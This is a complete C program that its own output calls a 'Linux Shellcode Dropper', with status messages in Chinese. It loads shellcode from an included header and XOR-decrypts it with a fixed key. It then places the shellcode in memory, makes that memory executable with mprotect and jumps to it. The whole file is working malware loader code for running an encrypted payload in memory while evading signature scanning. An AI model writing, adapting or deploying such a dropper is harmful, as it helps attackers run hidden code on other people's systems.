#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

void xor_decrypt(unsigned char *data, unsigned int data_len, unsigned char key) {
    for (unsigned int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

int main() {
    printf("[+] Linux Shellcode Dropper 啟動\n");
    #include "encrypted_shellcode.h"
    unsigned char key = 0xAA;
    printf("[+] Shellcode 長度: %u bytes\n", shellcode_len);
    printf("[+] 解密金鑰: 0x%02X\n", key);
    printf("[+] 分配可讀寫記憶體...\n");
    void *mem = mmap(NULL, shellcode_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("[-] mmap 失敗"); return 1; }
    printf("[+] 記憶體分配成功: %p\n", mem);
    printf("[+] 複製加密 shellcode 到記憶體...\n");
    memcpy(mem, encrypted_shellcode, shellcode_len);
    printf("[+] 解密 shellcode...\n");
    xor_decrypt((unsigned char *)mem, shellcode_len, key);
    printf("[+] 更改記憶體保護為可執行...\n");
    if (mprotect(mem, shellcode_len, PROT_READ | PROT_EXEC) == -1) { perror("[-] mprotect 失敗"); munmap(mem, shellcode_len); return 1; }
    printf("[+] 記憶體保護更改成功\n");
    printf("[+] 準備執行 shellcode...\n");
    void (*shellcode_func)() = (void (*)())mem;
    printf("[+] 跳轉到 shellcode 位址: %p\n", shellcode_func);
    shellcode_func();
    printf("[+] Shellcode 執行完成\n");
    munmap(mem, shellcode_len);
    return 0;
}
